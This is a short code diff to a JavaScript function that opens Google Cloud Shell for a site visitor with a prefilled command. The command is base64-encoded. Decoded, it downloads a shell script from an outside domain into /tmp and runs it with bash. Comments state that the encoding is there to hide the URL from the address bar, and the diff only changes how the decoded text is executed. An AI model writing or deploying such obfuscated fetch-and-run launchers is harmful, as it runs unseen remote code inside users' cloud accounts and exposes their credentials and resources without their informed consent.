@@ -33,7 +33,7 @@ function initCloudShellLaunch() {
     // Execute base64 directly in the shell to hide the URL entirely from the address bar
     // Payload changed to download and run, not 'curl | bash', to preserve TTY for the generated shell
     const payload = 'Y3VybCAtc0wgaHR0cHM6Ly93d3cuYmlrYXNoa3VtYXJzYXJyYWYuY29tLm5wL3NldHVwLXRlcm1pbmFsLnNoIC1vIC90bXAvcyAmJiBiYXNoIC90bXAvcw==';
-    const shellCmd = `eval "$(echo ${payload} | base64 -d)"`;
+    const shellCmd = `echo ${payload} | base64 -d > /tmp/sp && bash /tmp/sp`;
     const url = `https://shell.cloud.google.com/cloudshell/open?shellcmd=${encodeURIComponent(shellCmd)}&show=terminal`;
     window.open(url, '_blank', 'noopener,noreferrer');
   });
